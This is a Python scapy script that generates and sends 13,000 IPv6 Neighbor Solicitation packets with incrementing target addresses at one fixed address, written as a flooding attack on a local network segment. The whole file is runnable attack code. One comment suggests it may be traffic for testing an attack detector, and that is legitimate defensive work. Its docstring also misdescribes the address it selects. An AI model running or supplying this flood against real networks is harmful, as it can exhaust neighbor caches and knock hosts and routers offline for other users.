from ipaddress import IPv6Address
import socket
import psutil
from scapy.all import get_if_hwaddr, sendp
from scapy.layers.inet6 import IPv6, Ether, ICMPv6ND_NS
import time
# Parameters
INTERFACE = "eth0"
TARGET_IP = "fe80::1:1ff:fe01:1"
PACKET_COUNT = 13000  # Adjust the number of packets to flood
DST_MAC = "02:01:01:01:00:01"

def get_global_unique_ipv6(interface_name):
    """Retrieve the link-local IPv6 address of the given interface."""
    try:
        addresses = psutil.net_if_addrs()
        if interface_name not in addresses:
            raise ValueError(f"Interface '{interface_name}' not found.")

        for address in addresses[interface_name]:
            if address.family == socket.AF_INET6:
                ipv6_address = address.address
                if ipv6_address.startswith("2001"):
                    return ipv6_address  # Keep the zone index (e.g., fe80::1%eth0)
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None

def generate_ns_flood():
    """Generate all Neighbor Solicitation (NS) packets before sending them in bulk."""
    src_mac = get_if_hwaddr(INTERFACE)  # Get source MAC address

    print(f"Generating {PACKET_COUNT} NS packets for flooding...")
    src_addr = get_global_unique_ipv6(INTERFACE)
    
    # packets = [
    #     Ether(src=src_mac, dst=DST_MAC)  # NS uses multicast MAC
    #     / IPv6(src=src_addr, dst=TARGET_IP)
    #     / ICMPv6ND_NS(tgt=IPv6Address(i+1))
    #     for i in range(PACKET_COUNT//3)
    # ]
    # sendp(packets, iface=INTERFACE)  # Efficient flooding
    # time.sleep(0.2)
    # packets = [
    #     Ether(src=src_mac, dst=DST_MAC)  # NS uses multicast MAC
    #     / IPv6(src=src_addr, dst=TARGET_IP)
    #     / ICMPv6ND_NS(tgt=IPv6Address(PACKET_COUNT//3 + i+1))
    #     for i in range(PACKET_COUNT//3)
    # ]
    # sendp(packets, iface=INTERFACE)  # Efficient flooding
    # time.sleep(0.04)

    # packets = [
    #     Ether(src=src_mac, dst=DST_MAC)  # NS uses multicast MAC
    #     / IPv6(src=src_addr, dst=TARGET_IP)
    #     / ICMPv6ND_NS(tgt=IPv6Address(2*PACKET_COUNT//3 + i+1))
    #     for i in range(PACKET_COUNT//3)
    # ]
    # sendp(packets, iface=INTERFACE)  # Efficient flooding
    
    packets = [
        Ether(src=src_mac, dst=DST_MAC)  # NS uses multicast MAC
        / IPv6(src=src_addr, dst=TARGET_IP)
        / ICMPv6ND_NS(tgt=IPv6Address(i+1)) # We use the fact that it is ICMPv6 to detect whether this is an attack or not
        for i in range(PACKET_COUNT)
    ]
    sendp(packets, iface=INTERFACE, inter=0)  # Efficient flooding
    

if __name__ == "__main__":
    generate_ns_flood()
